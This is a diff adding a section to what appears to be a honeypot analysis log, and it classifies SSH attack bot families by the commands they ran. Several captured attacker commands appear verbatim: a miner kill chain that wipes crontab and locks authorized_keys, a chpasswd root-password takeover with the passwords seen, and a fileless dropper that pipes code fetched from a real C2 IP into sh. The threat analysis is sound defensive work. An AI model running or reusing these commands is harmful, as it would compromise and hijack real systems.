@@ -413,6 +413,70 @@ partially accumulated), full exchange completed.
 
 ---
 
+### full session analysis -- bot families (2026-05-29)
+
+**687 unique commands, 235 sessions, 72h total.**
+
+---
+
+**Diicot GPU miner -- dominant family (~180 sessions, 2026-05-26/27)**
+
+Same recon script every time:
+```
+uname -s -v -n -r -m
+nproc
+lspci | egrep VGA && lspci | grep 3D
+uname -m
+```
+Advanced variant adds nvidia-smi pipeline then the kill chain:
+```
+crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /...
+```
+Wipes crontab, locks authorized_keys with chattr (competing attackers can't add SSH keys), kills other miners, deploys. Our fake Tesla T4 GPU response triggered the deployment stage. The bait worked.
+
+---
+
+**SCP dropper -- payload uploader (2026-05-26 17:50, one session)**
+
+Tried 11 directories in sequence looking for a writable path:
+/lib/, hidden dir, /dev/, /dev/shm/, /var/volatile/, /tmp/, /sys/, /var/lib/, /root/, /etc/, /var/log/
+Each: mkdir <random10chars> then scp -t -r <dir>/. Honeypot returned exit 0 on all -- bot thought it succeeded. Nothing uploaded. This is the same family from earlier, now confirmed as systematic directory bruteforce.
+
+---
+
+**Password changer -- persistence bot (2026-05-26 22:xx - 2026-05-27 01:xx)**
+
+Pattern: uname -a -> cat /etc/passwd -> passwd -> echo 'root:STRONGPW' | chpasswd
+Passwords seen: i5n#_o$_6qFK!$s and $MWtB6=$e6mK#=E (both strong random).
+Goal: lock out other attackers by changing root password. Tries interactive passwd first (fails in our shell), falls back to chpasswd pipe -- designed for real systems. Classic attacker move to claim exclusive access.
+
+---
+
+**C2 dropper -- fileless exec (2026-05-29, new, threshold=1)**
+
+```
+uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
+```
+auth_ok beacon (hex = "auth_ok\n") then pipe-to-sh from 14.46.136.77. Fileless -- nothing written to disk. Came via exec channel (invisible to old analysis). Hit 4+ times today from different IPs, same C2 -- botnet spray. Most dangerous pattern seen so far.
+
+---
+
+**VPS assessor -- infrastructure scout (2026-05-29 09:48, one session)**
+
+35 commands: package managers (apt/yum/pacman/zypper), shadow file read, disk I/O benchmark (dd bs=1M count=10), network interfaces, running services, connectivity check. Profiling the machine for deployment suitability. Did not deploy anything -- pure reconnaissance.
+
+---
+
+**Volume breakdown:**
+- 2026-05-26: 88 commands -- initial wave, mixed families
+- 2026-05-27: 545 commands -- Diicot heavy day
+- 2026-05-28: 10 commands -- genuinely quiet, not a script bug
+- 2026-05-29: 44 commands so far -- new families, C2 dropper
+
+2026-05-28 quiet period is real. The "command drought" in the analysis was partly the exec blind spot and partly actual silence.
+
+---
+
 ### exec channel blind spot + live dropper (2026-05-29)
 
 **Bug found: report.py and periods.py both undercount commands.**
